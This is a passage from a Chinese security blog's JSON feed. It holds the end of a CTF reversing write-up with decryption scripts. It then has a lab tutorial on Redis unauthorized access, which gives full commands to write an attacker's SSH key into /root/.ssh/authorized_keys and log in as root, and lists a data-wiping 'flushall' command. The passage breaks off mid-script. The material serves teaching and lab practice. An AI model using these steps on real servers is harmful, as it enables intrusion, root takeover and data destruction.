0x00F0C628, 0x00000022, 0x00F116D0, 0x00000067, 0x00F11090, 0x00000052, 0x00F090F0, 0x00000077, 0x00F0A410, 0x00000036, 0x00F0F308, 0x0000006F, 0x00F09608, 0x00000053, 0x00F11C60, 0x00000071, 0x00F0BB90, 0x00000075, 0x00F0D118, 0x00000040, 0x00F0C108, 0x00000070, 0x00F128C8, 0x00000072, 0x00F0E918, 0x0000000F, 0x00F12968, 0x0000006F, 0x00F0F128, 0x00000023, 0x00F0A408, 0x00000033, 0x00F096D0, 0x00000067, 0x00F10640, 0x00000048, 0x00F0D348, 0x0000007E, 0x00F0ED48, 0x0000002B, 0x00F0F130, 0x00000052, 0x00F0FA08, 0x00000000, 0x00F0B240, 0x00000034, 0x00F093A8, 0x0000001C, 0x00F0CED8, 0x00000058, 0x00F0C0C0, 0x00000015, 0x00F11F78, 0x00000030, 0x00F0AC90, 0x0000002F, 0x00F0FC40, 0x0000002B, 0x00F11910, 0x00000048, 0x00F10138, 0x00000062, 0x00F11A70, 0x0000004D, 0x00F0EE88, 0x0000003D, 0x00F11C80, 0x00000030, 0x00F0BD38, 0x00000019, 0x00F0E9D0, 0x0000007B, 0x00F0BC30, 0x0000006A, 0x00F0A070, 0x00000076, 0x00F12538, 0x00000000, 0x00F0C038, 0x0000006D, 0x00F0FDD0, 0x0000004B, 0x00F0EBE0, 0x0000002E, 0x00F0A530, 0x0000004C, 0x00F0C470, 0x00000027, 0x00F0E220, 0x0000002A, 0x00F11EC0, 0x00000052, 0x00F0BEE8, 0x00000071, 0x00F0DBF0, 0x0000004C, 0x00F0B148, 0x0000000E, 0x00F0FBC8, 0x00000055, 0x00F0B2D0, 0x00000006, 0x00F0CE90, 0x00000002, 0x00F10240, 0x00000073, 0x00F0C0E8, 0x00000064, 0x00F0B978, 0x0000004A, 0x00F0E4C8, 0x0000007E, 0x00F09E68, 0x0000000F, 0x00F0CFA8, 0x00000038, 0x00F11000, 0x00000041, 0x00F11528, 0x0000002D, 0x00F0A638, 0x00000051, 0x00F117E0, 0x00000013, 0x00F09200, 0x00000074, 0x00F102E0, 0x0000007B, 0x00F0DF90, 0x0000006E, 0x00F098A0, 0x00000055, 0x00F0D6A0, 0x00000059, 0x00F0F9C8, 0x00000043, 0x00F0B8F0, 0x00000006, 0x00F10D08, 0x00000041, 0x00F0D7B0, 0x0000004A, 0x00F12BA0, 0x00000049, 0x00F097B0, 0x00000006, 0x00F0EB58, 0x00000041, 0x00F0D658, 0x00000030, 0x00F0C030, 0x00000074, 0x00F12490, 0x00000011, 0x00F0E080, 0x00000073, 0x00F0C9B0, 0x0000003A, 0x00F11FF0, 0x0000000D, 0x00F0FDA8, 0x00000012, 0x00F0C800, 0x00000038, 0x00F0DC18, 0x00000046, 0x00F0BAF8, 0x0000002A, 0x00F0AC78, 0x00000067, 0x00F0FFC0, 0x0000006B, 0x00F0B5A8, 0x0000005F, 0x00F12838, 0x00000036, 0x00F09A20, 0x0000003F, 0x00F10CF8, 0x00000046, 0x00F0E8C8, 0x00000062, 0x00F0E2C8, 0x0000001D, 0x00F10FD8, 0x00000001, 0x00F121A0, 0x0000004B, 0x00F0AA00, 0x00000032, 0x00F0C960, 0x00000018, 0x00F0F900, 0x0000005E, 0x00F11170, 0x00000067, 0x00F0FA88, 0x0000002B, 0x00F0F610, 0x00000007, 0x00F0C910, 0x00000005, 0x00F09B50, 0x0000002E, 0x00F0EEE8, 0x00000015, 0x00F0A898, 0x0000000E, 0x00F0BF70, 0x00000071, 0x00F10108, 0x00000027, 0x00F11BC8, 0x0000004B, 0x00F098B8, 0x00000031, 0x00F0F198, 0x00000060, 0x00F0CF78, 0x00000053, 0x00F0ED78, 0x0000007E, 0x00F0A138, 0x0000001C, 0x00F0C120, 0x0000005A, 0x00F0C5E8, 0x0000003E, 0x00F0B468, 0x00000010, 0x00F0AF28, 0x00000018, 0x00F0C808, 0x0000006D, 0x00F11900, 0x00000036, 0x00F113A0, 0x0000001A, 0x00F0B8B8, 0x0000000B, 0x00F12370, 0x00000077, 0x00F0D580, 0x00000031, 0x00F0E590, 0x00000008, 0x00F0D800, 0x00000019, 0x00F12050, 0x00000014, 0x00F0D310, 0x00000033, 0x00F0A708, 0x00000061, 0x00F119F8, 0x00000004, 0x00F09E08, 0x0000003C, 0x00F12B30, 0x00000077, 0x00F0AC38, 0x00000023, 0x00F0A2F0, 0x00000000, 0x00F100D8, 0x00000062, 0x00F0E650, 0x00000020, 0x00F0F220, 0x00000044, 0x00F0CA60, 0x00000043, 0x00F0AB58, 0x00000058, 0x00F096E8, 0x00000013, 0x00F0CBB0, 0x00000056, 0x00F0C758, 0x00000032, 0x00F11288, 0x00000031, 0x00F0EC20, 0x00000072, 0x00F0A600, 0x00000046, 0x00F0B558, 0x00000023, 0x00F0EA80, 0x00000057, 0x00F0DF88, 0x00000038, 0x00F104B0, 0x0000003A, 0x00F10828, 0x00000049, 0x00F0EB00, 0x00000043, 0x00F09A78, 0x00000065, 0x00F0DC58, 0x00000018, 0x00F0E048, 0x00000043, 0x00F12768, 0x00000040, 0x00F0D8F8, 0x00000069, 0x00F0AFA0, 0x00000024, 0x00F0AA08, 0x00000038, 0x00F0DCF0, 0x00000069, 0x00F11BF0, 0x0000000B, 0x00F104D8, 0x00000042, 0x00F107E0, 0x0000002E, 0x00F0CAB8, 0x00000032, 0x00F0DD28, 0x00000013, 0x00F0B120, 0x00000053, 0x00F11798, 0x00000067, 0x00F0F2C0, 0x0000001D, 0x00F0FD80, 0x00000073, 0x00F0A498, 0x0000003E, 0x00F0AC38, 0x00000073, 0x00F0AFA0, 0x00000009, 0x00F0C078, 0x00000033, 0x00F0A020, 0x00000006, 0x00F0C8C8, 0x00000054, 0x00F0FD98, 0x00000021, 0x00F10BC0, 0x00000054, 0x00F11888, 0x00000014, 0x00F0D348, 0x00000048, 0x00F104C0, 0x00000074, 0x00F0E458, 0x00000078, 0x00F0DBC0, 0x00000019, 0x00F0E0C0, 0x00000034, 0x00F0FAD8, 0x00000023, 0x00F111E0, 0x0000001A, 0x00F10818, 0x00000003, 0x00F0D830, 0x00000029, 0x00F11840, 0x0000002A, 0x00F0CAA8, 0x0000005E, 0x00F0D930, 0x00000030, 0x00F11B60, 0x00000014, 0x00F11270, 0x0000005D, 0x00F0A648, 0x00000013, 0x00F11060, 0x0000001E, 0x00F0A2D8, 0x00000079, 0x00F0D188, 0x00000070, 0x00F0E610, 0x0000004B, 0x00F0D250, 0x00000054, 0x00F0CF18, 0x00000072, 0x00F0F8C8, 0x00000030, 0x00F0ECE0, 0x0000000E, 0x00F10BD0, 0x00000063, 0x00F0FF68, 0x00000024, 0x00F0E488, 0x0000004D, 0x00F0A200, 0x00000038, 0x00F0E210, 0x0000000B, 0x00F0E150, 0x0000006E, 0x00F10148, 0x0000004D, 0x00F11E10, 0x00000074, 0x00F10318, 0x0000006C, 0x00F0C188, 0x00000037, 0x00F0C620, 0x0000001E, 0x00F0F358, 0x0000004F, 0x00F0AC10, 0x0000007D, 0x00F0EC68, 0x0000004F, 0x00F0D350, 0x00000049, 0x00F11A38, 0x00000071, 0x00F09FD0, 0x00000000, 0x00F0C2A8, 0x00000008, 0x00F0D5B8, 0x00000040, 0x00F0BE00, 0x00000000, 0x00F0C5C0, 0x0000001E, 0x00F0EE90, 0x00000042, 0x00F11910, 0x0000004B, 0x00F0B850, 0x0000000D, 0x00F0EEF0, 0x00000035, 0x00F118A0, 0x00000052, 0x00F12300, 0x00000023, 0x00F0F768, 0x00000033, 0x00F10408, 0x00000036, 0x00F0F168, 0x0000005F, 0x00F0A570, 0x0000001B, 0x00F0FC70, 0x0000004D, 0x00F0B290, 0x0000001D, 0x00F0EFE8, 0x0000005F, 0x00F10210, 0x00000075, 0x00F0B2B0, 0x00000055, 0x00F0BC80, 0x0000001D, 0x00F11928, 0x00000057, 0x00F11F58, 0x00000053, 0x00F0F850]</span><br><span class=\"line\">base = 0xF09078</span><br><span class=\"line\">def dfs(array, node, path, depth):</span><br><span class=\"line\">    if depth == 48:</span><br><span class=\"line\">        print(path)</span><br><span class=\"line\">        result.append(path)</span><br><span class=\"line\">        return</span><br><span class=\"line\">    if depth &gt; 48:</span><br><span class=\"line\">        return</span><br><span class=\"line\">    for i in string.ascii_letters+string.digits+&quot;_!~@&quot;:</span><br><span class=\"line\">        i = ord(i)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            if i == (array[2*(i+node)]+5) or i == (array[2*(i+node)]-5):</span><br><span class=\"line\">                neighbor = (array[2*(i+node)+1] - base) // 8</span><br><span class=\"line\">                dfs(array, neighbor, path + chr(i), depth + 1)</span><br><span class=\"line\">        except IndexError:</span><br><span class=\"line\">            return</span><br><span class=\"line\">result = []</span><br><span class=\"line\">dfs(data, 0, &quot;&quot;, 0)</span><br><span class=\"line\"># Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~!</span><br></pre></td></tr></table></figure>\n<h4 id=\"babycpp\"><a class=\"markdownIt-Anchor\" href=\"#babycpp\">#</a> Babycpp</h4>\n<p>数据输入后，经过魔改 Tea 加密和 RC4 加密后，与 cipher 进行对比</p>\n<p>Tea 加密由 (std::for_each&lt;unsigned long *,main::{lambda (unsigned long<br>\n&amp;)#1}&gt;)(v21, v16_str, v16_str + 4i64 * v15_0c, v10); 进入</p>\n<p>void **fastcall main::{lambda(unsigned long &amp;)#1}::operator()(**int64<br>\n**a1, __int64<br>\na2) 进行密钥的赋值，接着进行在 text_79 中进行 delate 赋值并进行加密</p>\n<p>**int64 **fastcall a43ff4190df3b6eee1d76b074c6c98d7::unknown9(unsigned<br>\nlong *)::{lambda (void)#1}::operator () 最终的加密在该函数中进行</p>\n<p>加密后 b63a8f7f7e4797a753840481428f0f18::unknown11 (v12, v11); 进行 rc4 加密</p>\n<p>**int64 **fastcall<br>\nb63a8f7f7e4797a753840481428f0f18::unknown11(std::vector <code>&lt;unsigned char&gt;</code> <br>\n&amp;)::{lambda (unsigned char &amp;)#1}::operator () 进行主要的加密操作</p>\n<p>此部分直接动调 S_boxss</p>\n<p>最终脚本如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def xtea_decrypt(rounds, block, key):</span><br><span class=\"line\"></span><br><span class=\"line\">  v0, v1 = block</span><br><span class=\"line\"></span><br><span class=\"line\">  delta = 0xDEADBEEF</span><br><span class=\"line\"></span><br><span class=\"line\">  total = delta * rounds</span><br><span class=\"line\"></span><br><span class=\"line\">  for _ in range(rounds):</span><br><span class=\"line\"></span><br><span class=\"line\">    v1 = (v1 - (((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[(total&gt;&gt;11) &amp; 3]))) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">    total = (total - delta) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">    v0 = (v0 - (((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3]))) &amp; 0xFFFFFFFF</span><br><span class=\"line\"></span><br><span class=\"line\">  return v0, v1</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def adjust_value(val):</span><br><span class=\"line\"></span><br><span class=\"line\">  return val if val &gt;= 0 else 256 + val</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def merge_data(data):</span><br><span class=\"line\"></span><br><span class=\"line\">  return data[0] | (data[1] &lt;&lt; 8) | (data[2] &lt;&lt; 16) | (data[3] &lt;&lt; 24)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def process_data(cipher, Xor, add, st):</span><br><span class=\"line\"></span><br><span class=\"line\">  modified_data = [(adjust_value(cipher[i] ^ Xor[i]) - add[i]) ^ st[i] for i in range(50)]</span><br><span class=\"line\"></span><br><span class=\"line\">  return [merge_data(modified_data[i*4:(i+1)*4]) for i in range(12)]</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">def perform_decryption():</span><br><span class=\"line\"></span><br><span class=\"line\">  key = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476]</span><br><span class=\"line\"></span><br><span class=\"line\">  num_rounds = 0x100</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  cipher = [0x33, 0xB2, 0x49, 0x8C, 0x39, 0xDD, 0x60, 0x5F, 0x5F, 0x77, 0x72, 0xAB, 0x38, 0xD9, 0xED, 0xE7, 0xF3, 0xF0, 0x66, 0x67, 0x16, 0xC8, 0x53, 0x80, 0x71, 0xB2, 0xFA, 0x5E, 0x7C, 0x2B, 0xBB, 0x0B, 0xE5, 0x88, 0x82, 0x0B, 0x06, 0x8C, 0x8D, 0xAD, 0x47, 0xB5, 0x85, 0xBB, 0x06, 0x8D, 0x01, 0x2B] </span><br><span class=\"line\"></span><br><span class=\"line\">  Xor = [0xee, 0x17, 0x80, 0xe3, 0x17, 0xa, 0xe5, 0x53, 0x33, 0x9e, 0x2e, 0x1d, 0x5, 0x6f, 0xb4, 0x51, 0x9a, 0x36, 0x5c, 0xbd, 0x8, 0xa2, 0x34, 0xa3, 0x65, 0x59, 0x62, 0xae, 0x34, 0xd, 0xd0, 0xbc, 0x30, 0x81, 0xeb, 0x8c, 0x65, 0x36, 0xfd, 0x7e, 0x4a, 0x1e, 0x10, 0x27, 0xdd, 0x5a, 0xa4, 0xb]    </span><br><span class=\"line\"></span><br><span class=\"line\">  add = [0x56, 0x2d, 0xf8, 0x42, 0x7f, 0xc2, 0x26, 0x63, 0x83, 0x32, 0xc4, 0x3f, 0xb9, 0xa8, 0x7f, 0xc9, 0x43, 0x22, 0xc6, 0x89, 0x6b, 0x5d, 0xef, 0x2e, 0xe8, 0x20, 0xcd, 0xbf, 0x84, 0xf0, 0x7b, 0x4d, 0xd2, 0x3f, 0x4f, 0xb7, 0x95, 0xf0, 0xcd, 0x96, 0x57, 0x56, 0x43, 0xf1, 0x6b, 0x1, 0xc6, 0x36] </span><br><span class=\"line\"></span><br><span class=\"line\">  st = [0x3b, 0x3b, 0x3e, 0xe8, 0x2c, 0x72, 0x2e, 0xc7, 0xc7, 0xde, 0x12, 0xd1, 0x91, 0x34, 0x61, 0x59, 0x1d, 0x13, 0x81, 0xd4, 0x87, 0x67, 0xeb, 0x73, 0x7c, 0x58, 0xa4, 0x6a, 0x98, 0x97, 0x1f, 0x83, 0x2d, 0xa3, 0x90, 0x76, 0xdb, 0xf0, 0x18, 0x89, 0x8d, 0xe2, 0xa7, 0x2e, 0x44, 0xbc, 0x4c, 0x6c]  </span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">  final_data = process_data(cipher, Xor, add, st)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  for i in range(0, 12, 2):</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypted_block = xtea_decrypt(num_rounds, final_data[i:i+2], key)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(f&quot;Decrypted Block &#123;i//2&#125;: &#123;decrypted_block&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">perform_decryption()</span><br></pre></td></tr></table></figure>\n<h3 id=\"数据安全\"><a class=\"markdownIt-Anchor\" href=\"#数据安全\">#</a> 数据安全</h3>\n<h4 id=\"cyan-1\"><a class=\"markdownIt-Anchor\" href=\"#cyan-1\">#</a> Cyan-1</h4>\n<p>注册后做题就行了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706620684161-7a964022-5591-410c-8080-c58a91dfc5f7.png\" alt=\"\"></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "url": "https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "title": "未授权访问漏洞",
            "date_published": "2024-04-16T05:58:19.057Z",
            "content_html": "<blockquote>\n<p>未授权访问漏洞可以理解为安全配置、权限认证、授权页面存在缺陷，导致其他用户可以直接访问，从而引发权限可被操作，数据库、网站目录等敏感信息泄露。目前存在未授权访问漏洞的主要服务包括：NFS、Samba、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcache、CouchDB、Docker、Solr、Hadoop 等，使用时要注意。</p>\n</blockquote>\n<p><strong>Redis 未授权访问漏洞</strong></p>\n<blockquote>\n<p>Redis 是一种使用 ANSIC 语言编写的开源 Key-Value 型数据库。与 Memcache 相似，支持存储的 value 类型有很多种，其中包括 String（字符串）、List（链表）、Set（集合）、Zste（有序集合）、Hash（哈希）等。同时，Redis 还支持不同的排序方式。Redis 为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，，在此基础上实现主从同步。</p>\n</blockquote>\n<p>对 Redis 配置不当将会导致未授权访问漏洞，，从而被攻击者恶意利用。在特定条件下，如果 Redis 以 root 身份运行，攻击者可以用 root 权限的身份写入 SSH 公钥文件，通过 SSH 登录目标服务器。流程如下：</p>\n<blockquote>\n<p>密钥验证登录客户端生成公钥和私钥，将公钥提前部署在服务器上。<br>\n客户端发起连接请求。<br>\n服务器随机生成一个字符串，用本地的公钥加密，发送给客户端。<br>\n客户端通过私钥解密，将解密后的字符串发送给服务器。<br>\n服务器验证本地字符串和客户端发来的字符串的一致性，如果通过，则认证成功。</p>\n</blockquote>\n<p>进而会导致服务器权限被获取、泄露或发生加密勒索事件，为正常服务带来严重危害。通常，服务器上的 Redis 绑定在 0.0.0.0:6379，如果没有开启认证功能，且没有采用相关的安全策略，比如添加防火墙规则避免其他非信任来源 IP 访问等，将会导致 Redis 服务直接暴露在公网上，造成其他用户直接在非授权情况下访问 Redis 服务。</p>\n<p>通过手工进行未授权访问验证，在安装 Redis 服务的 Kali 系统中输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli-h IP</span><br></pre></td></tr></table></figure>\n<p>如果目标系统存在未授权访问漏洞，则可以成功进行连接。输入 info 命令，可以查看 Redis 服务的版本号、配置文件目录、进程 ID 号等<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ocG69JSA982uSTiK.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>漏洞利用</strong></p>\n<p>当与远程 Redis 建立好连接后，通过 Redis 指令就能查询所需要的敏感信息。下面就 Redis 一些常用指令进行简单介绍：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看key和其对应的值：keys *</span><br><span class=\"line\">获取用户名：get user</span><br><span class=\"line\">获取登录指令：get password</span><br><span class=\"line\">删除所有数据：flushall</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PwhMm1LB8LN6UmBp.png!thumbnail\" alt=\"\"></p>\n<p>如果 redis 拥有 root 权限，那么攻击者就可以将自己的公钥写入目标服务器的<br>\n /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器。</p>\n<p>接下来就拉取镜像实现 ssh 登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker pull medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure>\n<p>拉取 docker 镜像，并且启动环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run --name=redisvul -d -p 22:22 -p 6379:6379 medicean/vulapps:r_redis_1</span><br></pre></td></tr></table></figure>\n<p>这里由于是 docker 中的镜像，因此只能使用这一台机子来作为攻击机，因为 docker 中生成的一个虚拟网卡只能本机来进行访问，其他机子访问不了，既然本机作为攻击机，就先查看下本机的 ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig</span><br></pre></td></tr></table></figure>\n<p>再查看下 docker 中该容器的 ID<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QbG2DLhu7m9Y4wAk.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这里查看到我的容器 ID 为 9a4fe89bc623，接下来查看 docker 的 ip，通过命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>\n<p>进入 docker，通过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/hosts</span><br></pre></td></tr></table></figure>\n<p>来查看 ip<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4FyPW0dj99ZAYTzU.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>这样攻击机和靶机的 ip 都知道了，接着就是利用 redis 未授权访问漏洞写入公钥进行连接了</p>\n<p>先同样测试一下 redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F0hXSvvwMrcrZxf1.png!thumbnail\" alt=\"\"></p>\n<p>redis 未授权证明成功，接下来本地生成公钥进行传输</p>\n<p>（建议接下来全程用 root 用户操作，能够减少权限不够的报错）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kTm65oT3FRsBJWTV.png!thumbnail\" alt=\"\"></p>\n<p>三个问题直接回车就好，overwrite 是因为我之前进行生成过，询问是否覆盖，公钥生成完毕，将生成的公钥的值写入目标机当中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; /tmp/foo.txt</span><br><span class=\"line\">cat /tmp/foo.txt | redis-cli -h IP -p 6379 -x set crackit</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/T7LD5oTxTELJf35U.png!thumbnail\" alt=\"\"></p>\n<p>连接目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP -p 6379 </span><br></pre></td></tr></table></figure>\n<p>设置（更改）目录为 /root/.ssh，并将备份文件名设置为 authorized_keys</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh/</span><br><span class=\"line\">config get dir</span><br><span class=\"line\">config set dbfilename &quot;authorized_keys&quot;</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F1MA04PS1eh63Dly.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>最后利用私钥通过 ssh 连接目标</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@IP -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IX6kmiuiSQKe4Z30.png!thumbnail\" alt=\"\"></p>\n<p>连接成功，同样的命令 cat /etc/hosts 查看 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yhbUrod9FGqXnCnE.png!thumbnail\" alt=\"\"></p>\n<p>能看到成功 getshell 并且是 root 权限</p>\n<p>这里提一嘴，如果是用两台机子也可以，但有可能会出现虽然能对拉镜像的机子进行 redis 的连接，并且成功写入，但是 ssh 连不上的情况。这是因为 22 端口没进行映射，6379 端口是自动进行映射了，所以到最后一步 ssh 连接才会不成功</p>\n<p>接下来介绍怎么通过 python 脚本批量检测 redis 未授权访问漏洞</p>\n<p>先编写起始部分，类似于 C 语言中的 main () 函数，执行过程中没有发生异常时，执行定义的 start () 函数。通过 sys.argv [] 实现对外部指令的接收。其中，sys.argv [0] 代表代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 List 类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">                start(sys.argv[1:])</span><br><span class=\"line\">        except KeyboardInterrupt:</span><br><span class=\"line\">                print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure>\n<p>编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &quot;-“加上单个字母选项；长选项格式为”–&quot; 加上一个单词选项。opts 为一个两元组列表，每个元素为（选项串，附加参数）。如果没有附加参数则为空串。之后通过 for 循环输出 opts 列表中的数值并赋值给自己定义的变量：<br>\n接下来部分主要用于输出帮助信息，增加代码工具的可读性和易用性。为了使输出的信息更加美观简洁，可以通过转义字符设置输出字体的颜色，从而实现需要的效果。开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一个参数。对于结尾部分，可以省略，但是为了书写规范，建议以 \\033 [0m 结尾</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># banner信息</span><br><span class=\"line\">def banner():</span><br><span class=\"line\">    